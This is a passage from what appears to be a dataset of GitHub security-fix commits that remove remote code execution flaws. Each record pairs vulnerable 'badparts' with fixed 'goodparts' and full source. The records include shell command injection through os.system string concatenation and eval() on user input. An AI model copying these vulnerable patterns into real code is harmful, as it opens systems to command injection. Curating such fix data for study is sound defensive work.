\"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"results\"][filename] = stdout.decode(r.encoding)\n\n        os.remove(\"file_to_fix.py\")\n\n\ndef commit(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    fullname = data.get(\"fork_fullname\")\n\n    for file, new_file in data[\"results\"].items():\n        url = \"https://api.github.com/repos/{}/contents/{}\"\n        url = url.format(fullname, file)\n        params = {\"ref\": data[\"new_branch\"]}\n        r = requests.get(url, params=params, headers=headers, auth=auth)\n        sha_blob = r.json().get(\"sha\")\n        params[\"path\"] = file\n        content_code = base64.b64encode(new_file.encode()).decode(\"utf-8\")\n        request_json = {\n            \"path\": file,\n            \"message\": \"Fix pep8 errors in {}\".format(file),\n            \"content\": content_code,\n            \"sha\": sha_blob,\n            \"branch\": data.get(\"new_branch\"),\n        }\n        r = requests.put(url, json=request_json, headers=headers, auth=auth)\n\n\ndef create_pr(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/repos/{}/pulls\"\n    url = url.format(data[\"target_repo_fullname\"])\n    request_json = {\n        \"title\": \"Fix pep8 errors\",\n        \"head\": \"pep8speaks:{}\".format(data[\"new_branch\"]),\n        \"base\": data[\"target_repo_branch\"],\n        \"body\": \"The changes are suggested by autopep8\",\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n    if r.status_code == 201:\n        data[\"pr_url\"] = r.json()[\"html_url\"]\n    else:\n        data[\"error\"] = \"Pull request could not be created\"\n"}}, "msg": "Prevent Remote code execution, Closes #28"}}, "https://github.com/ntc-chip-revived/ChippyRuxpin": {"0cd7d78e4d806852fd75fee03c24cce322f76014": {"url": "https://api.github.com/repos/ntc-chip-revived/ChippyRuxpin/commits/0cd7d78e4d806852fd75fee03c24cce322f76014", "html_url": "https://github.com/ntc-chip-revived/ChippyRuxpin/commit/0cd7d78e4d806852fd75fee03c24cce322f76014", "message": "prevent remote code execution by passing argumrnts to subprocess.call instead of os.system", "sha": "0cd7d78e4d806852fd75fee03c24cce322f76014", "keyword": "remote code execution prevent", "diff": "diff --git a/chippyRuxpin.py b/chippyRuxpin.py\nold mode 100644\nnew mode 100755\nindex 92e9bd6..e03cae8\n--- a/chippyRuxpin.py\n+++ b/chippyRuxpin.py\n@@ -95,7 +95,7 @@ def talk(myText):\n     \r\n     os.system( \"espeak \\\",...\\\" 2>/dev/null\" ) # Sometimes the beginning of audio can get cut off. Insert silence.\r\n     time.sleep( 0.5 )\r\n-    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r\n+    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r\n     audio.play(\"speech.wav\")\r\n     return myText\r\n \r\n", "files": {"/chippyRuxpin.py": {"changes": [{"diff": "\n     \r\n     os.system( \"espeak \\\",...\\\" 2>/dev/null\" ) # Sometimes the beginning of audio can get cut off. Insert silence.\r\n     time.sleep( 0.5 )\r\n-    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r\n+    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r\n     audio.play(\"speech.wav\")\r\n     return myText\r\n \r\n", "add": 1, "remove": 1, "filename": "/chippyRuxpin.py", "badparts": ["    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r"], "goodparts": ["    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r"]}], "source": "\n \r \r \r consumerKey='INSERT YOUR CONSUMER KEY HERE FROM TWITTER'\r consumerSecret='INSERT YOUR CONSUMER SECRET HERE FROM TWITTER'\r accessTokenKey='INSERT YOUR ACCESS TOKEN KEY HERE FROM TWITTER'\r accessTokenSecret='INSERT YOUR ACCESS TOKEN SECRET HERE FROM TWITTER'\r \r import sys\r import time\r import subprocess\r import os\r from random import randint\r from threading import Thread\r from chippyRuxpin_audioPlayer import AudioPlayer\r from chippyRuxpin_gpio import GPIO\r from chippyRuxpin_twitter import ChippyTwitter\r from chippyRuxpin_webFramework import WebFramework\r \r fullMsg=\"\"\r \r MOUTH_OPEN=408 MOUTH_CLOSE=412 EYES_OPEN=410 EYES_CLOSE=414 \r io=GPIO() io.setup( MOUTH_OPEN)\r io.setup( EYES_OPEN)\r io.setup( MOUTH_CLOSE)\r io.setup( EYES_CLOSE)\r \r audio=None\r isRunning=True\r \r def updateMouth():\r lastMouthEvent=0\r lastMouthEventTime=0\r \r while( audio==None):\r time.sleep( 0.1)\r \r while isRunning:\r if( audio.mouthValue !=lastMouthEvent):\r lastMouthEvent=audio.mouthValue\r lastMouthEventTime=time.time()\r \r if( audio.mouthValue==1):\r io.set( MOUTH_OPEN, 1)\r io.set( MOUTH_CLOSE, 0)\r else:\r io.set( MOUTH_OPEN, 0)\r io.set( MOUTH_CLOSE, 1)\r else:\r if( time.time() -lastMouthEventTime > 0.4):\r io.set( MOUTH_OPEN, 0)\r io.set( MOUTH_CLOSE, 0)\r \r def updateEyes():\r while isRunning:\r io.set( EYES_CLOSE, 1)\r io.set( EYES_OPEN, 0)\r time.sleep(0.4)\r io.set( EYES_CLOSE, 0)\r io.set( EYES_OPEN, 1)\r time.sleep(0.4)\r io.set( EYES_CLOSE, 1)\r io.set( EYES_OPEN, 0)\r time.sleep(0.4)\r io.set( EYES_CLOSE, 0)\r io.set( EYES_OPEN, 0)\r time.sleep( randint( 0,7))\r \r def talk(myText):\r if( myText.find( \"twitter\") >=0):\r myText +=\"0\"\r myText=myText[7:-1]\r try:\r \t myText=twitter.getTweet( myText)\r \texcept:\r \t print( \"!!!ERROR: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\")\r return\r \r os.system( \"espeak \\\",...\\\" 2>/dev/null\") time.sleep( 0.5)\r os.system( \"espeak -w speech.wav \\\"\" +myText +\"\\\" -s 130\")\r audio.play(\"speech.wav\")\r return myText\r \r mouthThread=Thread(target=updateMouth)\r mouthThread.start()\r eyesThread=Thread(target=updateEyes)\r eyesThread.start() \r audio=AudioPlayer()\r \r if( consumerKey.find( 'TWITTER') >=0):\r print( \"WARNING: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\") \r else:\r twitter=ChippyTwitter(consumerKey,consumerSecret,accessTokenKey,accessTokenSecret)\r \r web=WebFramework(talk)\r isRunning=False\r io.cleanup()\r sys.exit(1)\r ", "sourceWithComments": "#!/usr/bin/python\r\n# Chippy Ruxpin by Next Thing Co\r\n# Powered by C.H.I.P., the world's first $9 computer!\r\n\r\n# apt-get install python-setuptools python-dev build-essential espeak alsa-utils\r\n# apt-get install python-alsaaudio python-numpy python-twitter python-bottle mplayer\r\n\r\n# IMPORTANT NOTE ABOUT TWITTER STUFF!\r\n# In order to retrieve tweets, you need to authorize this code to use your twitter account.\r\n# This involves obtaining some special tokens that are specific to you.\r\n# Please visit Twitter's website to obtain this information and put the values in the variables below.\r\n# For more information, visit this URL:\r\n# https://dev.twitter.com/oauth/overview/application-owner-access-tokens\r\n\r\nconsumerKey='INSERT YOUR CONSUMER KEY HERE FROM TWITTER'\r\nconsumerSecret='INSERT YOUR CONSUMER SECRET HERE FROM TWITTER'\r\naccessTokenKey='INSERT YOUR ACCESS TOKEN KEY HERE FROM TWITTER'\r\naccessTokenSecret='INSERT YOUR ACCESS TOKEN SECRET HERE FROM TWITTER'\r\n\r\nimport sys\r\nimport time\r\nimport subprocess\r\nimport os\r\nfrom random import randint\r\nfrom threading import Thread\r\nfrom chippyRuxpin_audioPlayer import AudioPlayer\r\nfrom chippyRuxpin_gpio import GPIO\r\nfrom chippyRuxpin_twitter import ChippyTwitter\r\nfrom chippyRuxpin_webFramework import WebFramework\r\n\r\nfullMsg = \"\"\r\n\r\nMOUTH_OPEN = 408 # GPIO pin assigned to open the mouth. XIO-P0\r\nMOUTH_CLOSE = 412 # GPIO pin assigned to close the mouth. XIO-P2\r\nEYES_OPEN = 410 # GPIO pin assigned to open the eyes. XIO-P4\r\nEYES_CLOSE = 414 # GPIO pin assigned to close the eyes. XIO-P6\r\n\r\nio = GPIO() #Establish connection to our GPIO pins.\r\nio.setup( MOUTH_OPEN )\r\nio.setup( EYES_OPEN )\r\nio.setup( MOUTH_CLOSE )\r\nio.setup( EYES_CLOSE )\r\n\r\naudio = None\r\nisRunning = True\r\n\r\ndef updateMouth():\r\n    lastMouthEvent = 0\r\n    lastMouthEventTime = 0\r\n\r\n    while( audio == None ):\r\n        time.sleep( 0.1 )\r\n        \r\n    while isRunning:\r\n        if( audio.mouthValue != lastMouthEvent ):\r\n            lastMouthEvent = audio.mouthValue\r\n            lastMouthEventTime = time.time()\r\n\r\n            if( audio.mouthValue == 1 ):\r\n                io.set( MOUTH_OPEN, 1 )\r\n                io.set( MOUTH_CLOSE, 0 )\r\n            else:\r\n                io.set( MOUTH_OPEN, 0 )\r\n                io.set( MOUTH_CLOSE, 1 )\r\n        else:\r\n            if( time.time() - lastMouthEventTime > 0.4 ):\r\n                io.set( MOUTH_OPEN, 0 )\r\n                io.set( MOUTH_CLOSE, 0 )\r\n\r\n# A routine for blinking the eyes in a semi-random fashion.\r\ndef updateEyes():\r\n    while isRunning:\r\n        io.set( EYES_CLOSE, 1 )\r\n        io.set( EYES_OPEN, 0 )\r\n        time.sleep(0.4)\r\n        io.set( EYES_CLOSE, 0 )\r\n        io.set( EYES_OPEN, 1 )\r\n        time.sleep(0.4)\r\n        io.set( EYES_CLOSE, 1 )\r\n        io.set( EYES_OPEN, 0 )\r\n        time.sleep(0.4)\r\n        io.set( EYES_CLOSE, 0 )\r\n        io.set( EYES_OPEN, 0 )\r\n        time.sleep( randint( 0,7) )\r\n   \r\ndef talk(myText):\r\n    if( myText.find( \"twitter\" ) >= 0 ):\r\n        myText += \"0\"\r\n        myText = myText[7:-1]\r\n        try:\r\n\t    myText = twitter.getTweet( myText )\r\n\texcept:\r\n\t    print( \"!!!ERROR: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\")\r\n            return\r\n    \r\n    os.system( \"espeak \\\",...\\\" 2>/dev/null\" ) # Sometimes the beginning of audio can get cut off. Insert silence.\r\n    time.sleep( 0.5 )\r\n    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r\n    audio.play(\"speech.wav\")\r\n    return myText\r\n\r\nmouthThread = Thread(target=updateMouth)\r\nmouthThread.start()\r\neyesThread = Thread(target=updateEyes)\r\neyesThread.start()     \r\naudio = AudioPlayer()\r\n\r\nif( consumerKey.find( 'TWITTER' ) >= 0 ):\r\n    print( \"WARNING: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\" )    \r\nelse:\r\n    twitter = ChippyTwitter(consumerKey,consumerSecret,accessTokenKey,accessTokenSecret)\r\n\r\nweb = WebFramework(talk)\r\nisRunning = False\r\nio.cleanup()\r\nsys.exit(1)\r\n"}}, "msg": "prevent remote code execution by passing argumrnts to subprocess.call instead of os.system"}}, "https://github.com/mw10178/ctplot_iw": {"5d2ff91db88bcc9f84d2b4b494f23448650d17b8": {"url": "https://api.github.com/repos/mw10178/ctplot_iw/commits/5d2ff91db88bcc9f84d2b4b494f23448650d17b8", "html_url": "https://github.com/mw10178/ctplot_iw/commit/5d2ff91db88bcc9f84d2b4b494f23448650d17b8", "message": "- fixes remote code execution vulnerability (closes #34)\n- prevent leaking file system paths to frontend (closes #33)", "sha": "5d2ff91db88bcc9f84d2b4b494f23448650d17b8", "keyword": "remote code execution prevent", "diff": "diff --git a/ctplot/plot.py b/ctplot/plot.py\nindex 86d0e30..e09e190 100644\n--- a/ctplot/plot.py\n+++ b/ctplot/plot.py\n@@ -16,7 +16,7 @@\n from safeeval import safeeval\n from locket import lock_file\n \n-logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n+logging.basicConfig(level = logging.DEBUG, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n \n log = logging.getLogger('plot')\n \n@@ -28,6 +28,7 @@\n \n def available_tables(d = os.path.dirname(__file__) + '/data'):\n     files = []\n+    dirlen = len(d)\n     for p, d, f in os.walk(d):\n         for ff in f:\n             files.append(path.join(p, ff))\n@@ -41,7 +42,7 @@ def available_tables(d = os.path.dirname(__file__) + '/data'):\n         try:\n             h5 = tables.openFile(f, 'r')\n             for n in h5.walkNodes(classname = 'Table'):\n-                tab = f + ':' + n._v_pathname\n+                tab = f[dirlen+1:] + ':' + n._v_pathname\n                 tabs[tab] = TableSpecs(n._v_title, n.colnames, json.loads(n.attrs.units), int(n.nrows))\n             h5.close()\n         except:\n@@ -200,7 +201,7 @@ def __init__(self, config , **kwargs):\n \n         # source with rate averaging\n         for i, s in enumerate(self.s):\n-            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)\n+            self._append('sr', '{}:{}:{}:{}'.format(path.join(config['datadir'], s), self.rw[i], self.rs[i], self.rc[i]) if s else None)\n \n         self.legend = []\n         self.textboxes = []\n@@ -233,7 +234,6 @@ def _prepare_data(self):\n         # prefilled with empty lists\n         expr_data = {}\n         joined_cuts = {}  # OR of all cuts\n-        log.debug('self.sr={}'.format(self.sr))\n         for n, s in enumerate(self.sr):\n             if s:\n                 if s not in expr_data:\n@@ -288,7 +288,6 @@ def _get_data(self, expr_data, filters, units = {}):\n             ss = s.strip().split(':')\n             with tables.openFile(ss[0], 'r') as h5:\n                 table = h5.getNode(ss[1])\n-\n                 window = float(eval(ss[2])) if ss[2] != 'None' else None\n                 shift = float(ss[3]) if ss[3] != 'None' else 1\n                 weight = ss[4] if ss[4] != 'None' else None\n@@ -512,7 +511,19 @@ def _configure_post(self):\n                     getattr(plt, '{}scale'.format(a))(s)\n                 r = getattr(self, a + 'r' + ('tw' if a == v else ''))\n                 if r:  # range (limits)\n-                    getattr(plt, '{}lim'.format(a))(eval(r))\n+                    rmin, rmax = r.split(',')\n+                    rlim = getattr(plt, '{}lim'.format(a))\n+                    # defaults\n+                    rmind, rmaxd = rlim()\n+                    # set range\n+                    try:\n+                        rmin = rmind if rmin == '' else float(rmin)\n+                        rmax = rmaxd if rmax == '' else float(rmax)\n+                        log.debug('rmin={}, rmax={}'.format(rmin, rmax))\n+                        rlim(rmin, rmax)\n+                    except ValueError:\n+                        # ignore if input is no float\n+                        pass\n \n         # legend\n         plt.axes(self.axes.values()[-1])  # activate last added axes\n@@ -551,17 +562,25 @@ def opts(self, i):\n         o = {}\n         for k, v in self.__dict__.iteritems():\n             if k.startswith('o') and v[i] is not None:\n-#                o[k[1:]] = v[i]\n-                try: o[k[1:]] = eval(v[i])\n-                except: o[k[1:]] = v[i]\n+                log.debug('v[{}]={}'.format(i, v[i]))\n+                log.debug('k[]={}'.format(k))\n+                try:\n+                    o[k[1:]] = float(v[i])\n+                except:\n+                    o[k[1:]] = v[i]\n         return o\n \n \n     def bins(self, i, a):\n         try:\n             b = getattr(self, a + 'b')[i]\n-            if b: return eval(b)\n-            else: raise\n+            if b:\n+                bn = b.split(',')\n+                if len(bn) == 1:\n+                    return float(bn[0])\n+                return tuple([float(x) for x in bn])\n+            else:\n+                raise\n         except:\n             return 0\n \n@@ -628,7 +647,7 @@ def save(self, name = 'fig', extensions = ('png', 'pdf', 'svg')):\n         names = []\n         for ext in extensions:\n             n = name + '.' + ext\n-            log.debug('saving plot to %n', n)\n+            log.debug('saving plot to %s', n)\n             plt.savefig(n, bbox_inches = 'tight', pad_inches = 0.5 if 'map' in self.m else 0.1, transparent = False)\n             names.append(n)\n \n@@ -664,9 +683,8 @@ def fit(self, i, x, y, yerr = None):\n                 yerr = yerr[m]\n             x , y = x[m], y[m]\n \n-\n-\n-            p = eval(self.fp[i])\n+            # gather fit parameters\n+            p = tuple([float(fp) for fp in self.fp[i].split(',')])\n             try:\n                 p, c = curve_fit(fitfunc, x, y, p, yerr)\n                 log.info('parameters = {}'.format(p))\ndiff --git a/ctplot/safeeval.py b/ctplot/safeeval.py\nindex 0832443..6fa8690 100644\n--- a/ctplot/safeeval.py\n+++ b/ctplot/safeeval.py\n@@ -14,19 +14,19 @@\n #    GNU General Public License for more details.\n #\n #    You should have received a copy of the GNU General Public License\n-#    along with this program.  If not, see <http://www.gnu.org/licenses/>. \n+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n #\n import numpy as np\n import dateutil.parser as dp\n \n-_safe_globals = {\"__builtins__\":None}\n+_safe_globals = { \"__builtins__\": None, \"__import__\": None }\n _safe_locals = {}\n \n-#add any needed builtins back in. \n+#add any needed builtins back in.\n for k in []:\n     _safe_locals[k] = eval(k)\n \n-# numpy functions    \n+# numpy functions\n for k, v in np.__dict__.iteritems():\n     _safe_locals[k] = getattr(np, k)\n \ndiff --git a/ctplot/web/js/99-web.js b/ctplot/web/js/99-web.js\nindex a2eb52f..3f52783 100644\n--- a/ctplot/web/js/99-web.js\n+++ b/ctplot/web/js/99-web.js\n@@ -93,6 +93,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.\n                 $.each(data, function(id, info) {\n                     // console.debug(id+' -- '+info);\n                     var m = id.match(/(.*):(.*)/);\n+                    console.log(m);\n                     // filename incl. path\n                     var file = m[1];\n                     // filename only, w/o path and extension\n@@ -103,7 +104,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.\n                     // add a selectable option for this dataset and table\n                     var opt = $('<option>').text(filename + ' - ' + info[0]).val(id).appendTo(datasetbox);\n \n-                    var experiment = file.match(/(.+?\\/)*(.*?)\\/.+?/)[2];\n+                    var experiment = file.match(/(.*?)\\/.+?/)[1];\n                     console.debug('experiment = ' + experiment + ' / ' + id);\n                     opt.addClass('ex-' + experiment);\n                     if (experimentbox.find('option').filter(function() {\n@@ -744,9 +745,6 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.\n             target = $(':input[name=\"'+target+'\"]');\n             target.val(target.val()+', '+input.val());\n             \n-            if(target.val().match(/^\\s*,\\s*$/)) {\n-                target.val('');\n-            }\n             console.debug(target.attr('name')+' = '+target.val());\n         });\n     }\n", "files": {"/ctplot/plot.py": {"changes": [{"diff": "\n from safeeval import safeeval\n from locket import lock_file\n \n-logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n+logging.basicConfig(level = logging.DEBUG, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n \n log = logging.getLogger('plot')\n \n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')"], "goodparts": ["logging.basicConfig(level = logging.DEBUG, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')"]}, {"diff": "\n         try:\n             h5 = tables.openFile(f, 'r')\n             for n in h5.walkNodes(classname = 'Table'):\n-                tab = f + ':' + n._v_pathname\n+                tab = f[dirlen+1:] + ':' + n._v_pathname\n                 tabs[tab] = TableSpecs(n._v_title, n.colnames, json.loads(n.attrs.units), int(n.nrows))\n             h5.close()\n         except:\n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["                tab = f + ':' + n._v_pathname"], "goodparts": ["                tab = f[dirlen+1:] + ':' + n._v_pathname"]}, {"diff": "\n \n         # source with rate averaging\n         for i, s in enumerate(self.s):\n-            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)\n+            self._append('sr', '{}:{}:{}:{}'.format(path.join(config['datadir'], s), self.rw[i], self.rs[i], self.rc[i]) if s else None)\n \n         self.legend = []\n         self.textboxes = []\n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["            self._append('sr', '{}:{}:{}:{}'.format(s, self.rw[i], self.rs[i], self.rc[i]) if s else None)"], "goodparts": ["            self._append('sr', '{}:{}:{}:{}'.format(path.join(config['datadir'], s), self.rw[i], self.rs[i], self.rc[i]) if s else None)"]}, {"diff": "\n         # prefilled with empty lists\n         expr_data = {}\n         joined_cuts = {}  # OR of all cuts\n-        log.debug('self.sr={}'.format(self.sr))\n         for n, s in enumerate(self.sr):\n             if s:\n                 if s not in expr_data:\n", "add": 0, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["        log.debug('self.sr={}'.format(self.sr))"], "goodparts": []}, {"diff": "\n                     getattr(plt, '{}scale'.format(a))(s)\n                 r = getattr(self, a + 'r' + ('tw' if a == v else ''))\n                 if r:  # range (limits)\n-                    getattr(plt, '{}lim'.format(a))(eval(r))\n+                    rmin, rmax = r.split(',')\n+                    rlim = getattr(plt, '{}lim'.format(a))\n+                    # defaults\n+                    rmind, rmaxd = rlim()\n+                    # set range\n+                    try:\n+                        rmin = rmind if rmin == '' else float(rmin)\n+                        rmax = rmaxd if rmax == '' else float(rmax)\n+                        log.debug('rmin={}, rmax={}'.format(rmin, rmax))\n+                        rlim(rmin, rmax)\n+                    except ValueError:\n+                        # ignore if input is no float\n+                        pass\n \n         # legend\n         plt.axes(self.axes.values()[-1])  # activate last added axes\n", "add": 13, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["                    getattr(plt, '{}lim'.format(a))(eval(r))"], "goodparts": ["                    rmin, rmax = r.split(',')", "                    rlim = getattr(plt, '{}lim'.format(a))", "                    rmind, rmaxd = rlim()", "                    try:", "                        rmin = rmind if rmin == '' else float(rmin)", "                        rmax = rmaxd if rmax == '' else float(rmax)", "                        log.debug('rmin={}, rmax={}'.format(rmin, rmax))", "                        rlim(rmin, rmax)", "                    except ValueError:", "                        pass"]}, {"diff": "\n         o = {}\n         for k, v in self.__dict__.iteritems():\n             if k.startswith('o') and v[i] is not None:\n-#                o[k[1:]] = v[i]\n-                try: o[k[1:]] = eval(v[i])\n-                except: o[k[1:]] = v[i]\n+                log.debug('v[{}]={}'.format(i, v[i]))\n+                log.debug('k[]={}'.format(k))\n+                try:\n+                    o[k[1:]] = float(v[i])\n+                except:\n+                    o[k[1:]] = v[i]\n         return o\n \n \n     def bins(self, i, a):\n         try:\n             b = getattr(self, a + 'b')[i]\n-            if b: return eval(b)\n-            else: raise\n+            if b:\n+                bn = b.split(',')\n+                if len(bn) == 1:\n+                    return float(bn[0])\n+                return tuple([float(x) for x in bn])\n+            else:\n+                raise\n         except:\n             return 0\n \n", "add": 13, "remove": 5, "filename": "/ctplot/plot.py", "badparts": ["                try: o[k[1:]] = eval(v[i])", "                except: o[k[1:]] = v[i]", "            if b: return eval(b)", "            else: raise"], "goodparts": ["                log.debug('v[{}]={}'.format(i, v[i]))", "                log.debug('k[]={}'.format(k))", "                try:", "                    o[k[1:]] = float(v[i])", "                except:", "                    o[k[1:]] = v[i]", "            if b:", "                bn = b.split(',')", "                if len(bn) == 1:", "                    return float(bn[0])", "                return tuple([float(x) for x in bn])", "            else:", "                raise"]}, {"diff": "\n         names = []\n         for ext in extensions:\n             n = name + '.' + ext\n-            log.debug('saving plot to %n', n)\n+            log.debug('saving plot to %s', n)\n             plt.savefig(n, bbox_inches = 'tight', pad_inches = 0.5 if 'map' in self.m else 0.1, transparent = False)\n             names.append(n)\n \n", "add": 1, "remove": 1, "filename": "/ctplot/plot.py", "badparts": ["            log.debug('saving plot to %n', n)"], "goodparts": ["            log.debug('saving plot to %s', n)"]}, {"diff": "\n                 yerr = yerr[m]\n             x , y = x[m], y[m]\n \n-\n-\n-            p = eval(self.fp[i])\n+            # gather fit parameters\n+            p = tuple([float(fp) for fp in self.fp[i].split(',')])\n             try:\n                 p, c = curve_fit(fitfunc, x, y, p, yerr)\n                 log.info('parameters = {}'.format(p))", "add": 2, "remove": 3, "filename": "/ctplot/plot.py", "badparts": ["            p = eval(self.fp[i])"], "goodparts": ["            p = tuple([float(fp) for fp in self.fp[i].split(',')])"]}]}, "/ctplot/safeeval.py": {"changes": [{"diff": "\n #    GNU General Public License for more details.\n #\n #    You should have received a copy of the GNU General Public License\n-#    along with this program.  If not, see <http://www.gnu.org/licenses/>. \n+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n #\n import numpy as np\n import dateutil.parser as dp\n \n-_safe_globals = {\"__builtins__\":None}\n+_safe_globals = { \"__builtins__\": None, \"__import__\": None }\n _safe_locals = {}\n \n-#add any needed builtins back in. \n+#add any needed builtins back in.\n for k in []:\n     _safe_locals[k] = eval(k)\n \n-# numpy functions    \n+# numpy functions\n for k, v in np.__dict__.iteritems():\n     _safe_locals[k] = getattr(np, k)\n", "add": 4, "remove": 4, "filename": "/ctplot/safeeval.py", "badparts": ["_safe_globals = {\"__builtins__\":None}"], "goodparts": ["_safe_globals = { \"__builtins__\": None, \"__import__\": None }"]}], "source": "\n import numpy as np import dateutil.parser as dp _safe_globals={\"__builtins__\":None} _safe_locals={} for k in[]: _safe_locals[k]=eval(k) for k, v in np.__dict__.iteritems(): _safe_locals[k]=getattr(np, k) _safe_locals['logbins']=lambda start, stop, count:[np.exp(x) for x in np.linspace(np.log(start), np.log(stop), count)] _safe_locals['since04']=lambda s:(dp.parse(s) -dp.parse('2004-01-01 00:00 +01')).total_seconds() class safeeval: def __init__(self, safe_globals=_safe_globals, safe_locals=_safe_locals): self.globals=safe_globals.copy() self.globals.update(safe_locals) self.locals={} def __setitem__(self, key, value): self.locals[key]=value def __getitem__(self, key): return self.locals[key] def __delitem__(self, key): del self.locals[key] def __call__(self, expr): return eval(expr, self.globals, self.locals) if __name__=='__main__': for k, v in _safe_locals.iteritems(): print k, v ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#    pyplot - python based data plotting tools\n#    created for DESY Zeuthen\n#    Copyright (C) 2012  Adam Lucke  software@louisenhof2.de\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU General Public License as published by\n#    the Free Software Foundation, either version 3 of the License, or\n#    (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU General Public License for more details.\n#\n#    You should have received a copy of the GNU General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>. \n#\nimport numpy as np\nimport dateutil.parser as dp\n\n_safe_globals = {\"__builtins__\":None}\n_safe_locals = {}\n\n#add any needed builtins back in. \nfor k in []:\n    _safe_locals[k] = eval(k)\n\n# numpy functions    \nfor k, v in np.__dict__.iteritems():\n    _safe_locals[k] = getattr(np, k)\n\n_safe_locals['logbins'] = lambda start, stop, count: [np.exp(x) for x in np.linspace(np.log(start), np.log(stop), count)]\n_safe_locals['since04'] = lambda s: (dp.parse(s) - dp.parse('2004-01-01 00:00 +01')).total_seconds()\n\nclass safeeval:\n    def __init__(self, safe_globals = _safe_globals, safe_locals = _safe_locals):\n        self.globals = safe_globals.copy()\n        self.globals.update(safe_locals)\n        self.locals = {}\n\n    def __setitem__(self, key, value):\n        self.locals[key] = value\n\n    def __getitem__(self, key):\n        return self.locals[key]\n\n    def __delitem__(self, key):\n        del self.locals[key]\n\n    def __call__(self, expr):\n#        print 'safeval', expr\n        return eval(expr, self.globals, self.locals)\n\nif __name__ == '__main__':\n    for k, v in _safe_locals.iteritems():\n        print k, v\n\n"}}, "msg": "- fixes remote code execution vulnerability (closes #34)\n- prevent leaking file system paths to frontend (closes #33)"}}, "https://github.com/mw10178/ctplot-tuto": {"5d2ff91db88bcc9f84d2b4b494f23448650d17b8": {"url": "https://api.github.com/repos/mw10178/ctplot-tuto/commits/5d2ff91db88bcc9f84d2b4b494f23448650d17b8", "html_url": "https://github.com/mw10178/ctplot-tuto/commit/5d2ff91db88bcc9f84d2b4b494f23448650d17b8", "message": "- fixes remote code execution vulnerability (closes #34)\n- prevent leaking file system paths to frontend (closes #33)", "sha": "5d2ff91db88bcc9f84d2b4b494f23448650d17b8", "keyword": "remote code execution prevent", "diff": "diff --git a/ctplot/plot.py b/ctplot/plot.py\nindex 86d0e30..e09e190 100644\n--- a/ctplot/plot.py\n+++ b/ctplot/plot.py\n@@ -16,7 +16,7 @@\n from safeeval import safeeval\n from locket import lock_file\n \n-logging.basicConfig(level = logging.ERROR, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n+logging.basicConfig(level = logging.DEBUG, format = '%(filename)s:%(funcName)s:%(lineno)d:%(message)s')\n \n log = logging.getLogger('plot')\n \n@@ -28,6 +28,7 @@\n \n def available_tables(d = os.path.dirname(__file__) + '/data'):\n     files = []\n+    dirlen = len(d)\n     for p, d, f in os.walk(d):\n         for ff in f:\n             files.append(path.join(p, ff))\n@@ -41,7 +42,7 @@ def available_tables(d = os.path.dirname(__file__) + '/data'):\n         try:\n             h5 = tables.openFile(f, 'r')\n             for n in h5.walkNodes(classname = 'Table'):\n-                tab = f + ':' + n._v_pathname\n+                tab = f[dirlen+1:] + ':' + n._v_pathname\n                 tabs[tab] = TableSpecs(n._v_title, n.colnames, json.loads(n.attrs.units), int(n.nrows))\n             h5.close()\n         except:\n@@ -200,7 +201,7 @@ def __init__(self, config , **kwargs):\n \n         # source with rate averaging\n         for i, s in 